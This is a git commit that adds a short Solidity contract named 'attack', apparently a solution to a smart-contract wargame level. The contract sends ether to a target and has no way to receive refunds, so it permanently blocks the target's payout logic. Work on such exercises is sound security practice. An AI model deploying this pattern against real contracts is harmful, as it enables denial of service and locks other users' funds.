975ba171ad8989069e1764e26da6fb9128458b20
박시우 <siw0218@naver.com>
2025-11-04 17:53:27 +0900

    Update King.sol

--- King.sol
+++ King.sol
@@ -1,1 +1,9 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
 
+contract attack {
+    constructor(address payable _addr) payable {
+        (bool ok,)=_addr.call{value: msg.value}("");
+        require(ok);
+    }
+}
